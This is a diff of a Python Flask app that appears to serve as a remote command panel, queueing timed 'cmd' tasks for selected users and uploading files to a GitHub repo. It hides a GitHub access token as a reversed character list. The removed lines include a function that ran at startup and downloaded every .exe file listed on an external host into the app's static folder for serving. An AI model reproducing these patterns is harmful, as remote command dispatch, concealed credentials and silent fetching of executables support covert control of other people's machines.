@@ -6,7 +6,6 @@ import base64
 import json
 import requests as rq
 import io
-from gtts import gTTS
 from zoneinfo import ZoneInfo
 
 app = Flask(__name__)
@@ -20,29 +19,7 @@ file_content = None
 folder_content = None
 selected_user = "93"
 output = ""
-STATIC_FOLDER = os.path.join("static")
 control_data = {}
-
-def download_exe():
-    response = rq.get("https://filehub-g1jf.onrender.com/list_files_json")
-    response.raise_for_status()
-    file_list = response.json()
-
-    for item in file_list:
-        if item.endswith(".exe"):
-            url = f"https://filehub-g1jf.onrender.com/download/{item}"
-            filename = os.path.join(STATIC_FOLDER, "apps", item)
-
-            os.makedirs(os.path.dirname(filename), exist_ok=True)
-
-            with rq.get(url, stream=True) as r:
-                r.raise_for_status()
-                with open(filename, 'wb') as f:
-                    for chunk in r.iter_content(chunk_size=8192):
-                        if chunk:
-                            f.write(chunk)
-
-download_exe()
 t = ['U', 'N', 'i', '4', 'I', '3', 'P', 'L', 'L', 'A', 'C', 'P', 'F', 'v', 'b', '0', 'V', 'A', '6', 'r', 'S', '0', 'b', 'i', '0', '4', 'z', '9', 'K', 'e', 'V', 'U', '0', '1', '2', 'm', '_', 'p', 'h', 'g']
 token = ""
 for i in reversed(t):
@@ -51,7 +28,7 @@ owner = "ms32-org"
 repo = "maksadPura"
 branch = "main" 
 commit_message = "file upload"
-
+STATIC_FOLDER = os.path.join("static")
 if not os.path.exists(STATIC_FOLDER):
     os.makedirs(STATIC_FOLDER)
 state_file = os.path.join(STATIC_FOLDER, "state.json")
@@ -172,6 +149,7 @@ def command():
     global startTime
     global selected_user
     global spam
+    global comTxt
     message_file = os.path.join(STATIC_FOLDER, "message.txt")
     tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
     
@@ -196,7 +174,10 @@ def command():
                             exe = exe.strftime("%d-%m-%Y %H:%M")
                             now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
                             if exe <= now:
-                                cmd = task["cmd"]
+                                if "dIsPlAy " in task["cmd"]:
+                                    comTxt = task["cmd"].replace("dIsPlAy ", "")
+                                else:
+                                    cmd = task["cmd"]
                                 tasks_to_delete = task["id"]
                                 break
     
@@ -886,29 +867,5 @@ def get_user():
         print("user successfully added")
 
     return user    
-
-@app.route('/tts', methods=['POST'])
-def tts():
-    data = request.get_json()
-    text = data.get('text', '').strip()
-
-    if not text:
-        return {'error': 'Text is required'}, 400
-
-    tts = gTTS(text, lang='en', slow=False)
-    tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.mp3')
-    tts.save(tmp.name)
-
-    @after_this_request
-    def cleanup(response):
-        try:
-            os.remove(tmp.name)
-        except Exception as e:
-            app.logger.error(f"Could not delete temp file: {e}")
-        return response
-
-    return send_file(tmp.name, mimetype='audio/mpeg', as_attachment=False)
-
-
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
